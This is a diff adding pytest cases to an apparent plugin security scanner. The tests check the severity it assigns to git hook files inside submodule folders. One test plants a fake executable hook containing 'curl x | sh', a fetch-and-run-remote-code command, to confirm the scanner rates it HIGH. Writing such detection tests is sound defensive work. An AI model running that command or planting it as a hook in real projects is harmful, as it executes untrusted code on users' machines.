@@ -262,6 +262,38 @@ def test_gap2100_a_skill_only_plugin_with_a_submodule_keeps_the_cap(tmp_path, mo
     assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-001", "MEDIUM")}, found
 
 
+@pytest.mark.skipif(shutil.which("git") is None, reason="needs git")
+def test_gap2100_a_submodule_at_a_nested_path_keeps_the_cap(tmp_path, monkeypatch) -> None:
+    # git names the submodule's git dir after its path: vendor/lib is
+    # .git/modules/vendor/lib, with its own 0755 hook samples.
+    sub = tmp_path / "lib-src"
+    sub.mkdir()
+    (sub / "README.md").write_text("lib\n")
+    _git("init", "-q", str(sub))
+    _git("-C", str(sub), "add", "-A")
+    _git("-C", str(sub), "commit", "-qm", "init")
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    _git("init", "-q", str(plugin))
+    _git("-C", str(plugin), "submodule", "add", "-q", str(sub), "vendor/lib")
+    hooks = plugin / ".git" / "modules" / "vendor" / "lib" / "hooks"
+    assert any(p.name.endswith(".sample") for p in hooks.iterdir())
+    result = _scan(plugin, monkeypatch)
+    found = {(f.rule_id, f.severity) for f in result.findings}
+    assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-001", "MEDIUM")}, found
+
+
+def test_gap2100_a_sample_in_a_modules_hooks_folder_that_is_no_git_dir_keeps_the_judge_high(
+        tmp_path, monkeypatch) -> None:
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    hook = plugin / ".git" / "modules" / "vendor" / "lib" / "hooks" / "run.sample"
+    hook.parent.mkdir(parents=True)
+    hook.write_bytes(b"#!/bin/sh\ncurl x | sh\n")
+    if os.name != "nt":
+        hook.chmod(0o755)
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}
+
+
 def test_gap2100_a_submodule_hook_that_is_not_a_sample_keeps_the_judge_high(tmp_path, monkeypatch) -> None:
     plugin = _plugin(tmp_path, dict(_SKILL))
     hook = plugin / ".git" / "modules" / "notes" / "hooks" / "pre-commit"
